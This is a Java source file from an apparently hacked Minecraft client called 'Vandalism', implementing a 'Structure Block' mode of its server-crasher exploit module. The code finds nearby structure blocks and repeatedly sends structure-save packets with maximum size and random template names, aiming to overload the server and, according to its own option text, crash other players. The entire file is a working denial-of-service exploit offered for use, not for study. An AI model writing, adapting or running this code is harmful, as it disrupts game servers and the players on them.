/*
 * This file is part of Vandalism - https://github.com/NekosAreKawaii/Vandalism
 * Copyright (C) 2023-2024 NekosAreKawaii, Verschlxfene, FooFieOwO, Recyz and contributors
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */

package de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.impl.multi;

import de.nekosarekawaii.vandalism.Vandalism;
import de.nekosarekawaii.vandalism.base.FabricBootstrap;
import de.nekosarekawaii.vandalism.base.value.impl.number.IntegerValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.BooleanValue;
import de.nekosarekawaii.vandalism.base.value.impl.primitive.StringValue;
import de.nekosarekawaii.vandalism.event.game.WorldListener;
import de.nekosarekawaii.vandalism.event.network.DisconnectListener;
import de.nekosarekawaii.vandalism.feature.module.impl.exploit.servercrasher.ServerCrasherModule;
import de.nekosarekawaii.vandalism.feature.module.template.module.MultiExecutionModuleMode;
import de.nekosarekawaii.vandalism.util.math.RandomUtils;
import net.minecraft.block.StructureBlock;
import net.minecraft.block.entity.StructureBlockBlockEntity;
import net.minecraft.block.enums.StructureBlockMode;
import net.minecraft.network.ClientConnection;
import net.minecraft.network.packet.c2s.play.UpdateStructureBlockC2SPacket;
import net.minecraft.text.Text;
import net.minecraft.util.BlockMirror;
import net.minecraft.util.BlockRotation;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3i;

import java.util.ArrayList;
import java.util.List;

public class StructureBlockModuleMode extends MultiExecutionModuleMode<ServerCrasherModule> implements WorldListener, DisconnectListener {

    private final IntegerValue range = new IntegerValue(
            this,
            "Range",
            "The range in which the structure blocks should be searched.",
            40,
            1,
            100
    );

    private final BooleanValue randomizeTemplateName = new BooleanValue(
            this,
            "Randomize Template Name",
            "Whether the template name should be randomized or not.",
            true
    );

    private final BooleanValue useUpperCaseNames = new BooleanValue(
            this,
            "Use Upper Case Names",
            "Whether the template name can be upper case or not.",
            false
    ).visibleCondition(this.randomizeTemplateName::getValue);

    private final BooleanValue useSpecialCharacterNames = new BooleanValue(
            this,
            "Use Special Character Names",
            "Whether the template name can contain special characters or not.",
            false
    ).visibleCondition(this.randomizeTemplateName::getValue);

    private final StringValue templateName = new StringValue(
            this,
            "Template Name",
            "The name of the template.",
            "fucked_by_" + FabricBootstrap.MOD_ID
    ).visibleCondition(() -> !this.randomizeTemplateName.getValue());

    private final IntegerValue size = new IntegerValue(
            this,
            "Size",
            "The size of the structure.",
            48,
            -48,
            48
    );

    private final BooleanValue showAir = new BooleanValue(
            this,
            "Show Air",
            "This value allows you to crash some players.",
            true
    );

    private final BooleanValue showBoundingBox = new BooleanValue(
            this,
            "Show Bounding Box",
            "This value also allows you to crash some players.",
            true
    );

    private final List<BlockPos> structureBlocks = new ArrayList<>();
    private int current = 0;

    public StructureBlockModuleMode(final ServerCrasherModule parent) {
        super("Structure Block", parent);
    }

    private void reset() {
        this.current = 0;
        this.structureBlocks.clear();
    }

    @Override
    public void onActivate() {
        Vandalism.getInstance().getEventSystem().subscribe(this, WorldLoadEvent.ID, DisconnectEvent.ID);
        this.reset();
        super.onActivate();
    }

    @Override
    public void onDeactivate() {
        super.onDeactivate();
        this.reset();
        Vandalism.getInstance().getEventSystem().unsubscribe(this, WorldLoadEvent.ID, DisconnectEvent.ID);
    }

    @Override
    public void onPreWorldLoad() {
        this.reset();
    }

    @Override
    public void onDisconnect(final ClientConnection clientConnection, final Text disconnectReason) {
        this.reset();
    }

    @Override
    protected void onExecute() {
        final int range = this.range.getValue();
        final StructureBlockBlockEntity.Action action = StructureBlockBlockEntity.Action.SAVE_AREA;
        final StructureBlockMode mode = StructureBlockMode.SAVE;
        final String templateName = this.randomizeTemplateName.getValue() ? RandomUtils.randomString(
                30,
                30,
                true,
                this.useUpperCaseNames.getValue(),
                true,
                this.useSpecialCharacterNames.getValue()
        ) : this.templateName.getValue();
        final BlockPos offset = new BlockPos(0, 1, 0);
        final Vec3i size = new Vec3i(this.size.getValue(), this.size.getValue(), this.size.getValue());
        final BlockMirror mirror = BlockMirror.NONE;
        final BlockRotation rotation = BlockRotation.NONE;
        final String metadata = "";
        final boolean ignoreEntities = false;
        final boolean showAir = this.showAir.getValue();
        final boolean showBoundingBox = this.showBoundingBox.getValue();
        final float blockIntegrity = 1.0f;
        final long randomizationSeed = 0;
        if (this.structureBlocks.isEmpty()) {
            for (int x = -range; x < range; x++) {
                for (int y = -range; y < range; y++) {
                    for (int z = -range; z < range; z++) {
                        final BlockPos blockPos = new BlockPos(
                                (int) (mc.player.getX() + x),
                                (int) (mc.player.getY() + y),
                                (int) (mc.player.getZ() + z)
                        );
                        if (mc.world.getBlockState(blockPos).getBlock() instanceof StructureBlock) {
                            this.structureBlocks.add(blockPos);
                        }
                    }
                }
            }
            this.current = 0;
            return;
        }
        mc.getNetworkHandler().getConnection().send(new UpdateStructureBlockC2SPacket(
                this.structureBlocks.get(this.current),
                action,
                mode,
                templateName,
                offset,
                size,
                mirror,
                rotation,
                metadata,
                ignoreEntities,
                showAir,
                showBoundingBox,
                blockIntegrity,
                randomizationSeed
        ), null, true);
        if (this.current < this.structureBlocks.size() - 1) this.current++;
        else this.current = 0;
    }

}
